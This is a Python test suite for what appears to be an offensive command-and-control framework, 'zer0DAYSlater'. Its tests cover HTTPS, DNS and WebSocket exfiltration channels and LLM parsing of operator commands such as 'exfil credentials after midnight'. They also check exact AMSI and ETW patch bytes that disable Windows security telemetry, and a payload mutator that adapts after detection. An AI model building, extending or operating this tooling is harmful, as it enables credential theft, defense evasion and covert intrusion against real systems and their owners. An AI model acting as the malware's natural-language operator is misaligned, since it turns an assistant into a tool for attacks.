"""
zer0DAYSlater core test suite.
Tests parse logic, config loading, and channel interface contracts.
"""
import os
import sys

# Ensure project root is on path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))


# ── Config ────────────────────────────────────────────────────────────────────

def test_config_loads():
    from config import CONFIG
    assert isinstance(CONFIG, dict)
    for key in ("mqtt_broker", "mqtt_port", "https_endpoint", "auth_token",
                 "c2_ws_url", "plugin_server"):
        assert key in CONFIG, f"Missing key in CONFIG: {key}"


def test_config_no_hardcoded_secrets():
    from config import CONFIG
    assert CONFIG["auth_token"] != "test-token", \
        "Hardcoded test-token still present in config"
    assert "yourserver" not in CONFIG.get("c2_ws_url", ""), \
        "Placeholder URL still present in c2_ws_url"
    assert "yourserver" not in CONFIG.get("plugin_server", ""), \
        "Placeholder URL still present in plugin_server"


# ── LLM command parser ────────────────────────────────────────────────────────

def test_parse_exfil_command():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("exfil user profiles after midnight")
    assert result["action"] == "exfil"
    assert result["filters"].get("target") == "user_profiles"
    assert result["schedule"] is not None


def test_parse_scheduled_time():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("exfil credentials after 3pm")
    assert result["schedule"] is not None
    assert result["action"] == "exfil"


def test_parse_unknown_command_returns_none_action():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("do something vague")
    assert result["action"] is None


def test_parse_returns_required_keys():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("")
    assert "action" in result
    assert "filters" in result
    assert "schedule" in result


# ── Channel interface contracts ───────────────────────────────────────────────

def test_exfil_https_interface():
    """send_via_https and get_task_https must accept agent_id as first arg."""
    import inspect
    from core.exfil_https import send_via_https, get_task_https
    sig_send = inspect.signature(send_via_https)
    sig_get = inspect.signature(get_task_https)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_exfil_dns_interface():
    import inspect
    from core.exfil_dns import send_via_dns, get_task_dns
    sig_send = inspect.signature(send_via_dns)
    sig_get = inspect.signature(get_task_dns)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_exfil_ws_interface():
    import inspect
    from core.exfil_ws import send_via_ws, get_task_ws
    sig_send = inspect.signature(send_via_ws)
    sig_get = inspect.signature(get_task_ws)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_channel_send_returns_bool_when_unconfigured():
    """All send functions must return False (not raise) when env not set."""
    from core.exfil_https import send_via_https
    from core.exfil_dns import send_via_dns
    from core.exfil_ws import send_via_ws
    assert send_via_https("test-agent", {}) is False
    assert send_via_dns("test-agent", {}) is False
    assert send_via_ws("test-agent", {}) is False


def test_channel_get_returns_none_when_unconfigured():
    """All get functions must return None (not raise) when env not set."""
    from core.exfil_https import get_task_https
    from core.exfil_dns import get_task_dns
    from core.exfil_ws import get_task_ws
    assert get_task_https("test-agent") is None
    assert get_task_dns("test-agent") is None
    assert get_task_ws("test-agent") is None


# ── Evasion patch bytes ───────────────────────────────────────────────────────

def test_amsi_patch_bytes_correct():
    """Verify AMSI patch is xor eax,eax; ret — not corrupted escape sequences."""
    import ast
    import pathlib
    src = pathlib.Path("evasion_win.py").read_text()
    # Find the AMSI patch line
    for line in src.splitlines():
        if "patch" in line and "xor eax" in line:
            # Extract the bytes literal
            val = line.split("=")[1].strip().split("#")[0].strip()
            b = ast.literal_eval(val)
            assert b == b"\x31\xc0\xc3", f"AMSI patch bytes wrong: {b.hex()}"
            return
    raise AssertionError("AMSI patch line not found in evasion_win.py")


def test_etw_patch_bytes_correct():
    """Verify ETW patch is xor rax,rax; ret."""
    import ast
    import pathlib
    src = pathlib.Path("evasion_win.py").read_text()
    for line in src.splitlines():
        if "patch" in line and "xor rax" in line:
            val = line.split("=")[1].strip().split("#")[0].strip()
            b = ast.literal_eval(val)
            assert b == b"\x48\x33\xc0\xc3", f"ETW patch bytes wrong: {b.hex()}"
            return
    raise AssertionError("ETW patch line not found in evasion_win.py")


# ── LLM Operator (structure only — no live Ollama required) ───────────────────

def test_llm_operator_imports():
    from llm_operator import parse_operator_command, _resolve_time_expression
    assert callable(parse_operator_command)
    assert callable(_resolve_time_expression)


def test_resolve_midnight():
    from llm_operator import _resolve_time_expression
    result = _resolve_time_expression("exfil after midnight")
    assert result is not None
    import datetime
    dt = datetime.datetime.fromisoformat(result)
    assert dt.hour == 0
    assert dt.minute == 1


def test_resolve_relative_time_minutes():
    from llm_operator import _resolve_time_expression
    result = _resolve_time_expression("run in 30 minutes")
    assert result is not None


def test_resolve_pm_time():
    from llm_operator import _resolve_time_expression
    result = _resolve_time_expression("execute after 3pm")
    assert result is not None
    import datetime
    dt = datetime.datetime.fromisoformat(result)
    assert dt.hour == 15


def test_resolve_no_time_returns_none():
    from llm_operator import _resolve_time_expression
    result = _resolve_time_expression("exfil user profiles quietly")
    assert result is None


def test_null_result_structure():
    from llm_operator import _null_result
    result = _null_result("test command", "test error")
    for key in ("action", "targets", "schedule", "priority", "noise", "_error"):
        assert key in result
    assert result["action"] is None
    assert result["_error"] == "test error"


# ── Session Drift Monitor ─────────────────────────────────────────────────────

def test_drift_monitor_imports():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    assert SessionDriftMonitor is not None


def test_baseline_established_on_first_ingest():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    action = {
        "action": "exfil", "targets": ["user_profiles"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "test", "_error": None,
    }
    status = monitor.ingest(action)
    assert monitor.baseline is not None
    assert monitor.baseline.action == "exfil"
    assert status["drift_score"] < 0.10  # first action may have minor structural signals


def test_nominal_action_low_drift():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    base = {
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    }
    monitor.ingest(base)
    same = dict(base)
    status = monitor.ingest(same)
    assert status["drift_score"] < 0.40
    assert not status["halt"]


def test_semantic_drift_detected():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    })
    status = monitor.ingest({
        "action": "persist", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "drift", "_error": None,
    })
    types = [s["type"] for s in status["signals"]]
    assert DriftType.SEMANTIC_DRIFT.value in types


def test_noise_violation_detected():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    })
    status = monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "aggressive", "rationale": "loud", "_error": None,
    })
    types = [s["type"] for s in status["signals"]]
    assert DriftType.NOISE_VIOLATION.value in types


def test_scope_creep_detected():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["user_profiles"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    })
    status = monitor.ingest({
        "action": "exfil",
        "targets": ["user_profiles", "credentials", "ssh_keys", "documents"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "expanded", "_error": None,
    })
    types = [s["type"] for s in status["signals"]]
    assert DriftType.SCOPE_CREEP.value in types


def test_parse_failure_signals_high_severity():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": [],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "base", "_error": None,
    })
    status = monitor.ingest({
        "action": None, "targets": [],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "",
        "_error": "JSON parse failed: ...",
    })
    types = [s["type"] for s in status["signals"]]
    assert DriftType.PARSE_FAILURE.value in types
    parse_sig = next(s for s in status["signals"]
                     if s["type"] == DriftType.PARSE_FAILURE.value)
    assert parse_sig["severity"] >= 0.7


def test_drift_score_caps_at_1():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    })
    for _ in range(10):
        monitor.ingest({
            "action": "persist",
            "targets": ["everything", "credentials", "ssh_keys", "documents",
                        "domain_controller", "network"],
            "schedule": None, "priority": "high",
            "noise": "aggressive", "rationale": "",
            "_error": "JSON parse failed",
        })
    assert monitor.drift_score <= 1.0


def test_monitor_reset_clears_state():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "base", "_error": None,
    })
    monitor.reset()
    assert monitor.baseline is None
    assert monitor.drift_score == 0.0
    assert monitor.action_count == 0


def test_report_structure():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "base", "_error": None,
    })
    report = monitor.report()
    for key in ("session_actions", "drift_score", "status",
                "total_signals", "signal_breakdown", "baseline"):
        assert key in report
    assert report["status"] in ("NOMINAL", "WARN", "HALT")


# ── Entropy Capsule Engine ────────────────────────────────────────────────────

def test_entropy_capsule_imports():
    from entropy_capsule import EntropyCapsuleEngine, InstabilityType
    assert EntropyCapsuleEngine is not None


def test_entropy_nominal_action_low_score():
    from entropy_capsule import EntropyCapsuleEngine
    engine = EntropyCapsuleEngine()
    action = {
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent",
        "rationale": "Operator wants credential exfil deferred to low-activity window.",
        "_error": None,
    }
    engine.ingest(action, original_command="exfil credentials after midnight")
    assert engine.current_entropy() < 0.40


def test_entropy_missing_rationale_raises_score():
    from entropy_capsule import EntropyCapsuleEngine
    engine = EntropyCapsuleEngine()
    action = {
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "", "_error": None,
    }
    engine.ingest(action)
    assert engine.current_entropy() > 0.20


def test_entropy_null_fields_detected():
    from entropy_capsule import EntropyCapsuleEngine, InstabilityType
    engine = EntropyCapsuleEngine()
    action = {
        "action": None, "targets": [],
        "schedule": None, "priority": None,
        "noise": None, "rationale": "",
        "_error": "JSON parse failed",
    }
    signals = engine.ingest(action)
    types = [s["type"] for s in signals]
    assert any(t in types for t in [InstabilityType.CONFIDENCE_COLLAPSE.value, InstabilityType.TOKEN_ENTROPY.value, InstabilityType.COHERENCE_DRIFT.value])
    assert InstabilityType.CONFIDENCE_COLLAPSE.value in types


def test_entropy_hallucination_detected():
    from entropy_capsule import EntropyCapsuleEngine, InstabilityType
    engine = EntropyCapsuleEngine()
    action = {
        "action": "exfil",
        "targets": ["satellite_data", "nuclear_codes", "alien_frequencies"],
        "schedule": None, "priority": "normal",
        "noise": "normal",
        "rationale": "Operator wants exfil.",
        "_error": None,
    }
    signals = engine.ingest(
        action,
        original_command="exfil credentials"
    )
    types = [s["type"] for s in signals]
    assert InstabilityType.HALLUCINATION.value in types


def test_entropy_instability_spike_detected():
    from entropy_capsule import EntropyCapsuleEngine, InstabilityType
    engine = EntropyCapsuleEngine()
    # First action — low entropy
    engine.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent",
        "rationale": "Operator wants credential exfiltration quietly.",
        "_error": None,
    })
    # Second action — high entropy (sudden collapse)
    signals = engine.ingest({
        "action": None, "targets": ["*", "everything"],
        "schedule": None, "priority": None,
        "noise": None, "rationale": "",
        "_error": "parse failed",
    })
    types = [s["type"] for s in signals]
    assert InstabilityType.INSTABILITY_SPIKE.value in types


def test_entropy_report_structure():
    from entropy_capsule import EntropyCapsuleEngine
    engine = EntropyCapsuleEngine()
    engine.ingest({
        "action": "recon", "targets": [],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "Scanning network.", "_error": None,
    })
    report = engine.report()
    for key in ("session_actions", "entropy_score", "status",
                "total_signals", "signal_breakdown", "capsule_history"):
        assert key in report
    assert report["status"] in ("NOMINAL", "ELEVATED", "CRITICAL")


def test_entropy_reset():
    from entropy_capsule import EntropyCapsuleEngine
    engine = EntropyCapsuleEngine()
    engine.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "test", "_error": None,
    })
    engine.reset()
    assert engine.current_entropy() == 0.0
    assert engine.action_count == 0


# ── Payload Mutator ───────────────────────────────────────────────────────────

def test_payload_mutator_imports():
    from payload_mutator import PayloadMutator, Personality, MutationOp
    assert PayloadMutator is not None


def test_mutator_produces_result():
    from payload_mutator import PayloadMutator
    mutator = PayloadMutator()
    result = mutator.mutate(
        {"action": "exfil", "noise": "silent", "targets": ["credentials"]}
    )
    assert result.personality is not None
    assert result.payload_hash is not None
    assert len(result.payload_hash) == 16
    assert result.fitness_score > 0


def test_mutator_respects_noise_silent():
    from payload_mutator import PayloadMutator, Personality, MutationOp
    mutator = PayloadMutator()
    result = mutator.mutate(
        {"action": "exfil", "noise": "silent", "targets": ["credentials"]}
    )
    # Silent mode should not use aggressive ops
    assert MutationOp.FRAGMENT not in result.mutation_ops


def test_mutator_action_affinity():
    from payload_mutator import PayloadMutator, Personality
    mutator = PayloadMutator()
    result = mutator.mutate(
        {"action": "exfil", "noise": "normal", "targets": ["credentials"]}
    )
    # exfil affinity: leech, ghost, surgeon
    assert result.personality in (
        Personality.LEECH, Personality.GHOST, Personality.SURGEON
    )


def test_mutator_fitness_updates_on_feedback():
    from payload_mutator import PayloadMutator, ChannelFeedback
    mutator = PayloadMutator()
    result = mutator.mutate(
        {"action": "exfil", "noise": "normal", "targets": ["credentials"]}
    )
    initial_fitness = mutator.memory.fitness[result.personality]

    # Successful feedback — fitness should increase
    mutator.feedback(ChannelFeedback(
        payload_hash=result.payload_hash,
        success=True, detected=False,
        channel="HTTPS", latency_ms=100,
    ))
    assert mutator.memory.fitness[result.personality] > initial_fitness


def test_mutator_fitness_drops_on_detection():
    from payload_mutator import PayloadMutator, ChannelFeedback
    mutator = PayloadMutator()
    result = mutator.mutate(
        {"action": "exfil", "noise": "normal", "targets": ["credentials"]}
    )
    initial_fitness = mutator.memory.fitness[result.personality]

    mutator.feedback(ChannelFeedback(
        payload_hash=result.payload_hash,
        success=False, detected=True,
        channel="DNS", latency_ms=200,
    ))
    assert mutator.memory.fitness[result.personality] < initial_fitness


def test_mutator_high_entropy_triggers_rotate():
    from payload_mutator import PayloadMutator, MutationOp
    mutator = PayloadMutator()
    result = mutator.mutate(
        {"action": "exfil", "noise": "silent", "targets": ["credentials"]},
        entropy_score=0.80,
        drift_score=0.70,
    )
    assert MutationOp.ROTATE in result.mutation_ops


def test_mutator_fitness_report():
    from payload_mutator import PayloadMutator, Personality
    mutator = PayloadMutator()
    report = mutator.fitness_report()
    assert len(report) == len(Personality)
    for v in report.values():
        assert 0.0 <= v <= 1.0


# ── mTLS Mesh ─────────────────────────────────────────────────────────────────

def test_mtls_mesh_imports():
    from mtls_mesh import MTLSMesh, PeerStatus, MeshMsgType
    assert MTLSMesh is not None


def test_mesh_keypair_generation():
    from mtls_mesh import MTLSMesh
    node = MTLSMesh()
    assert node.fingerprint is not None
    assert len(node.fingerprint) == 16
    assert node.public_key_b64 is not None


def test_handshake_token_valid():
    import hashlib
    from mtls_mesh import MTLSMesh, _sign_handshake, _verify_handshake
    node     = MTLSMesh()
    token    = _sign_handshake(node.private_key, "192.168.1.1")
    hmac_key = hashlib.sha256(bytes(node.private_key)).digest()
    assert _verify_handshake(node.public_key_b64, token, "192.168.1.1", hmac_key=hmac_key)


def test_handshake_token_tampered_rejected():
    import hashlib
    from mtls_mesh import MTLSMesh, _sign_handshake, _verify_handshake
    node     = MTLSMesh()
    token    = _sign_handshake(node.private_key, "192.168.1.1")
    tampered = token[:-4] + "xxxx"
    hmac_key = hashlib.sha256(bytes(node.private_key)).digest()
    assert not _verify_handshake(node.public_key_b64, tampered, "192.168.1.1", hmac_key=hmac_key)


def test_handshake_wrong_ip_rejected():
    import hashlib
    from mtls_mesh import MTLSMesh, _sign_handshake, _verify_handshake
    node     = MTLSMesh()
    token    = _sign_handshake(node.private_key, "192.168.1.1")
    hmac_key = hashlib.sha256(bytes(node.private_key)).digest()
    assert not _verify_handshake(node.public_key_b64, token, "10.0.0.99", hmac_key=hmac_key)


def test_encrypted_roundtrip():
    from mtls_mesh import MTLSMesh, _make_box, _encrypt, _decrypt
    node_a = MTLSMesh()
    node_b = MTLSMesh()
    box_ab = _make_box(node_a.private_key, node_b.public_key)
    box_ba = _make_box(node_b.private_key, node_a.public_key)
    msg = {"op": "test", "data": {"value": 42}}
    assert _decrypt(box_ba, _encrypt(box_ab, msg)) == msg


def test_tampered_ciphertext_rejected():
    from mtls_mesh import MTLSMesh, _make_box, _encrypt, _decrypt
    import pytest
    node_a = MTLSMesh()
    node_b = MTLSMesh()
    box_ab = _make_box(node_a.private_key, node_b.public_key)
    box_ba = _make_box(node_b.private_key, node_a.public_key)
    enc = bytearray(_encrypt(box_ab, {"test": "data"}))
    enc[32] ^= 0xFF
    with pytest.raises(Exception):
        _decrypt(box_ba, bytes(enc))


def test_quarantine_sets_status():
    from mtls_mesh import MTLSMesh, PeerStatus
    node = MTLSMesh()
    node.add_peer("10.0.0.1")
    node._quarantine("10.0.0.1", "test")
    assert node.peers["10.0.0.1"].status == PeerStatus.QUARANTINED
    assert node.stats["peers_quarantined"] == 1


def test_unverified_peer_cannot_receive_data():
    from mtls_mesh import MTLSMesh
    node = MTLSMesh()
    node.add_peer("10.0.0.1")
    # send_to should return False — peer not verified
    result = node.send_to("10.0.0.1", {"op": "test"})
    assert result is False


def test_mesh_status_structure():
    from mtls_mesh import MTLSMesh
    node = MTLSMesh()
    node.add_peer("10.0.0.1")
    status = node.status()
    assert "node_fingerprint" in status
    assert "peers" in status
    assert "stats" in status
    assert "10.0.0.1" in status["peers"]


def test_two_nodes_different_fingerprints():
    from mtls_mesh import MTLSMesh
    node_a = MTLSMesh()
    node_b = MTLSMesh()
    assert node_a.fingerprint != node_b.fingerprint
